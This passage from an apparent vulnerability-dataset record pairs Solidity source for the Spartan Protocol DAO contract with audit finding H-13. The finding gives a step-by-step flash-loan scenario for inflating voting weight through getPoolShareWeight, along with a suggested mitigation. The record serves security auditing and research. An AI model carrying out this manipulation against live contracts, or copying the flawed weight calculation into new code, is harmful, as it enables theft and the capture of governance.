parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n   \n\n",
        "CodeNames": [
            "BondVault.sol",
            "Pool.sol",
            "Dao.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-13",
                "Location": [
                    "",
                    "harvest",
                    "depositLP",
                    "getPoolShareWeight",
                    "deposit",
                    "baseAmount",
                    "totalSupply"
                ],
                "Type": " Flash loan manipulation on  getPoolShareWeight  of  Utils ",
                "Description": "\nThe getPoolShareWeight function returns a user's pool share weight by calculating how many SPARTAN the user's LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.\n\nAccording to the implementation of getPoolShareWeight, a user's pool share weight is calculated by uints * baseAmount / totalSupply, where uints is the number of user's LP tokens, totalSupply is the total supply of LP tokens, and baseAmount is the number of SPARTAN in the pool. Thus, a user's pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:\n\n1. Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool.\n2. The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool's baseAmount. He could split his trade into small amounts to reduce slip-based fees.\n3. The attacker now wants to increase his weight in the DaoVault. He adds his LP tokens to the pool by calling the deposit function of Dao.\n4. Dao then calls depositLP of DaoVault, causing the attacker's weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker's weight is artificially increased.\n5. With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling harvest of the Dao contract.\n6. The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.\n\nReferenced code:\nUtils.sol#L46-L50(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50),\nUtils.sol#L70-L77(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77),\nDaoVault.sol#L44-L56(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56),\nDao.sol#L201(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201), and\nDao.sol#L570(https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570).\n\nA possible mitigation is to record the current timestamp when a user's weight in the DaoVault or BondVault is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.\n\nSamusElderg (Spartan) confirmed and disagreed with severity(https://github.com/code-423n4/2021-07-spartan-findings/issues/238#issuecomment-886351432):\n  Recommended mitigation has been included in contributors ongoing discussions to make this more resistant to manipulation\n\nghoul-sol (judge) commented(https://github.com/code-423n4/2021-07-spartan-findings/issues/238#issuecomment-894866142):\n  Keeping high risk because of impact\n\n\n",
                "Repair": ""
            }
        ]
    }
]